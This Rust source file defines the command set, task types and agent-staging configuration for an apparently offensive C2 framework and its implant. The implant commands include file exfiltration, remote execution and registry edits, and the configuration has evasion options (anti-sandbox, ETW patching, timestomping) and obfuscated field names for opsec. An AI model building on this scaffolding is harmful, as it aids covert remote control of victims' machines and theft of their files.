use core::panic;
use serde::{Deserialize, Serialize};
use std::{
    fmt::{Debug, Display},
    mem::transmute,
    path::PathBuf,
};

use crate::task_types::{BuildAllBins, FileCopyInner, RegAddInner, RegQueryInner};

/// Commands supported by the implant and C2.
///
/// To convert an integer `u32` to a [`Command`], use [`Command::from_u32`].
///
/// # Safety
/// We are using 'C' style enums to avoid needing serde to ser/deser types through the network.
/// When interpreting a command integer, it **MUST** in all cases, be interpreted by [std::mem::transmute]
/// as a `u32`, otherwise you risk UB.
#[repr(u32)]
#[derive(Serialize, Deserialize, Copy, Clone, PartialEq, Eq)]
pub enum Command {
    Sleep = 1u32,
    Ps,
    GetUsername,
    Pillage,
    UpdateSleepTime,
    Pwd,
    // Used when the beacon first boots, sending self metadata to the c2
    AgentsFirstSessionBeacon,
    Cd,
    KillAgent,
    KillProcess,
    Ls,
    Run,
    /// Uploads a file to the target machine
    Drop,
    /// Copies a file
    Copy,
    /// Moves a file
    Move,
    /// Removes a file
    RmFile,
    /// Removes a directory
    RmDir,
    /// Pulls a file from the target machine, downloading to the C2
    Pull,
    RegQuery,
    RegAdd,
    RegDelete,
    // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
    // make sure it is itemised last in the enum
    Undefined,
}

#[derive(Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct FileDropMetadata {
    pub internal_name: String,
    pub download_name: String,
    pub download_uri: Option<String>,
}

pub const DELIM_FILE_DROP_METADATA: &str = ",";

impl Into<String> for FileDropMetadata {
    fn into(self) -> String {
        //
        // IMPORTANT:
        // We serialise the data for FileDropMetadata via a string, delimited by commas.
        // If we make any changes to FileDropMetadata we need to ensure the below format is free of the
        // delimiter; AND we need to check that when we deserialise using From<&str> for FileDropMetadata
        // that we pull out the fields in the same order they are serialised.
        //
        // Was facing some issues with the struct name being present in the binary which I couldn't avoid.
        // The data for this is encoded under the wire, so there should be no network based OPSEC issues with
        // this approach.
        //

        // Do some input checks, we cannot contain the delimiter, otherwise panic.
        assert!(!self.internal_name.contains(DELIM_FILE_DROP_METADATA));
        assert!(!self.download_name.contains(DELIM_FILE_DROP_METADATA));
        assert!(
            !self
                .download_uri
                .as_deref()
                .unwrap_or_default()
                .contains(DELIM_FILE_DROP_METADATA)
        );

        format!(
            "{}{d}{}{d}{}",
            self.internal_name,
            self.download_name,
            self.download_uri.as_deref().unwrap_or_default(),
            d = DELIM_FILE_DROP_METADATA,
        )
    }
}

impl From<&str> for FileDropMetadata {
    /// Convert a `&str` to a [`FileDropMetadata`]. The data as a string must be delimited by
    /// commas, and not contain commas within the substrings.
    ///
    /// # Panics
    /// This function will panic if there are not an exact number of fields which is expected. Aside from bad implementation,
    /// this would be caused by the delimiter appearing within the encoded substrings.
    fn from(value: &str) -> Self {
        //
        // IMPORTANT
        // See notes in `impl Into<String> for FileDropMetadata` to make sure we adhere to the rules
        // around the ordering and content of contained data.
        //

        let parts: Vec<&str> = value.split(",").collect();

        assert_eq!(parts.len(), 3);

        let download_uri: Option<String> = if parts[2].is_empty() {
            None
        } else {
            Some(parts[2].to_string())
        };

        Self {
            internal_name: parts[0].into(),
            download_name: parts[1].into(),
            download_uri,
        }
    }
}

impl Into<u32> for Command {
    fn into(self) -> u32 {
        self as u32
    }
}

impl Command {
    pub fn from_u32(id: u32) -> Self {
        // SAFETY: We have type safe signature ensuring that the input type is a u32 for the conversion
        unsafe { transmute(id) }
    }

    pub fn to_u16_tuple_le(&self) -> (u16, u16) {
        let low_word: u16 = (*self as u32 & 0xFFFF) as u16;
        let high_word: u16 = (*self as u32 >> 16) as u16;

        (low_word, high_word)
    }

    /// Determines whether the task is auto-completable for the database
    pub fn is_autocomplete(&self) -> bool {
        matches!(
            self,
            Command::Sleep | Command::UpdateSleepTime | Command::KillAgent
        )
    }
}

#[cfg(debug_assertions)]
impl Display for Command {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let choice = match self {
            Command::Sleep => "Sleep",
            Command::Ps => "ListProcesses",
            Command::Undefined => "Undefined -> You received an invalid code.",
            Command::GetUsername => "GetUsername",
            Command::Pillage => "ListUsersDirs",
            Command::UpdateSleepTime => "UpdateSleepTime",
            Command::Pwd => "Pwd",
            Command::AgentsFirstSessionBeacon => "AgentsFirstSessionBeacon",
            Command::Cd => "Cd",
            Command::KillAgent => "KillAgent",
            Command::Ls => "Ls",
            Command::Run => "Run",
            Command::KillProcess => "KillProcess",
            Command::Drop => "Drop",
            Command::Copy => "Copy",
            Command::Move => "Move",
            Command::Pull => "Pull",
            Command::RegQuery => "reg query",
            Command::RegAdd => "reg add",
            Command::RegDelete => "reg del",
            Command::RmFile => "RmFile",
            Command::RmDir => "RmDir",
        };

        write!(f, "{choice}")
    }
}

#[derive(Serialize, Deserialize, Clone)]
pub enum AdminCommand {
    Sleep(i64),
    ListAgents,
    ListProcesses,
    GetUsername,
    ListUsersDirs,
    Pwd,
    KillAgent,
    KillProcessById(String),
    Cd(String),
    Ls,
    ShowServerTime,
    StageFileOnC2(FileUploadStagingFromClient),
    Login,
    ListStagedResources,
    DeleteStagedResource(String),
    Run(String),
    RemoveAgentFromList,
    Drop(FileDropMetadata),
    Copy(FileCopyInner),
    Move(FileCopyInner),
    RmFile(String),
    RmDir(String),
    /// Pulls a file from the target machine, downloading to the C2
    Pull(String),
    BuildAllBins(String),
    RegQuery(RegQueryInner),
    RegAdd(RegAddInner),
    RegDelete(RegQueryInner),
    /// Exports the completed tasks database for an agent.
    ExportDb,
    /// Used for dispatching no admin command, but to be handled via a custom route on the C2
    None,
    Undefined,
}

#[repr(C)]
#[derive(Serialize)]
pub struct Task {
    pub id: i32,
    pub command: Command,
    pub completed_time: i64,
    pub metadata: Option<String>,
}

impl Task {
    pub fn from(id: i32, command: Command, metadata: Option<String>) -> Self {
        Self {
            id,
            command,
            metadata,
            completed_time: 0,
        }
    }
}

impl Display for Task {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        #[cfg(debug_assertions)]
        return write!(
            f,
            "id: {}, command: {}, metadata: {:?}",
            self.id, self.command, self.metadata
        );

        #[cfg(not(debug_assertions))]
        return write!(f, "");
    }
}

#[derive(Serialize, Deserialize, Clone, Default)]
#[serde(rename = "abc")]
pub struct FirstRunData {
    /// `a` is alias for `cwd`
    pub a: PathBuf,
    /// `b` is alias for `pid`
    pub b: u32,
    /// `c` is alias for `process_name`
    pub c: String,
    /// `d` is alias for `agent_name_as_named_by_operator`
    ///
    /// The agent name given to it by the operator during creation, think of this as a
    /// 'family' name.
    pub d: String,
    /// `e` is an alias for teh `Sleep time` of the agent in seconds
    pub e: u64,
}

/// Check whether a list of tasks contains the `KillAgent` [`Command`].
///
/// # Returns
/// - `true`: If [`Command::KillAgent`] is present
/// - `false`: If it is not present.
pub fn tasks_contains_kill_agent<T>(tasks: &T) -> bool
where
    for<'a> &'a T: IntoIterator<Item = &'a Task>,
{
    tasks.into_iter().any(|t| t.command == Command::KillAgent)
}

#[derive(Serialize, Deserialize, Clone)]
pub enum WyrmResult<T: Serialize> {
    Ok(T),
    Err(String),
}

impl<T: Serialize> Debug for WyrmResult<T> {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Ok(_) => f.debug_tuple("Ok").finish(),
            Self::Err(e) => f.debug_tuple("Err").field(e).finish(),
        }
    }
}

impl<T: Serialize> Default for WyrmResult<T> {
    fn default() -> Self {
        Self::Err("abcdefghijklmnop".into())
    }
}

impl<T: Serialize> WyrmResult<T> {
    pub fn unwrap(self) -> T {
        match self {
            WyrmResult::Ok(x) => x,
            WyrmResult::Err(_) => panic!(),
        }
    }

    pub fn is_err(&self) -> bool {
        match self {
            WyrmResult::Ok(_) => false,
            WyrmResult::Err(e) => {
                // As the default sets the message to `""` (opsec to prevent strings in binary)
                // we check whether the error contained is the default initialiser
                e != "abcdefghijklmnop"
            }
        }
    }

    pub fn is_empty(&self) -> bool {
        if let Self::Err(e) = self
            && e == "abcdefghijklmnop"
        {
            return true;
        }

        false
    }
}

/// Configuration of a new agent that the C2 will create; the agent will then be staged at `staging_endpoint` on the
/// server.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct NewAgentStaging {
    pub implant_name: String,
    pub default_sleep_time: i64,
    pub c2_address: String,
    pub c2_endpoints: Vec<String>,
    pub staging_endpoint: String,
    pub pe_name: String,
    pub port: u16,
    /// A token which validates the agent with the C2. This will prevent attacks whereby an adversary enters an WWW-Authenticate header,
    /// as this would allow them to connect to the C2 as an 'agent'. Their attack would likely be very limited, but it would be possible
    /// for them to POST to the database, etc.
    ///
    /// This token will also help reduce a little server load / ability to be DOS'ed, as the token can be used for authorisation before the
    /// server actually processes the request (via middleware).
    pub agent_security_token: String,
    pub antisandbox_trig: bool,
    pub antisandbox_ram: bool,
    pub stage_type: StageType,
    pub build_debug: bool,
    pub useragent: String,
    pub patch_etw: bool,
    pub jitter: Option<u64>,
    pub timestomp: Option<String>,
}

#[derive(Serialize, Deserialize, Copy, Clone, Debug, PartialEq)]
pub enum StageType {
    Dll,
    Exe,
    All,
}

impl Display for StageType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            StageType::Dll => write!(f, "dll"),
            StageType::Exe => write!(f, "exe"),
            StageType::All => write!(f, "all"),
        }
    }
}

/// Data which relates to a file upload to be staged on the server.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct FileUploadStagingFromClient {
    pub download_name: String,
    pub api_endpoint: String,
    pub file_data: Vec<u8>,
}

#[derive(Serialize, Deserialize, Clone)]
#[serde(rename = "a")]
pub struct PowershellOutput {
    #[serde(rename = "b")]
    pub stdout: Option<String>,
    #[serde(rename = "c")]
    pub stderr: Option<String>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename = "a")]
pub struct ExfiltratedFile {
    #[serde(rename = "a")]
    pub hostname: String,
    #[serde(rename = "b")]
    pub file_path: String,
    #[serde(rename = "c")]
    pub file_data: Vec<u8>,
}

impl ExfiltratedFile {
    pub fn new(hostname: String, file_path: String, file_data: Vec<u8>) -> Self {
        Self {
            hostname,
            file_path,
            file_data,
        }
    }
}

#[derive(Serialize, Deserialize)]
pub struct BaBData {
    pub implant_key: String,
}

impl BaBData {
    pub fn from(implant_key: String) -> Self {
        Self { implant_key }
    }
}
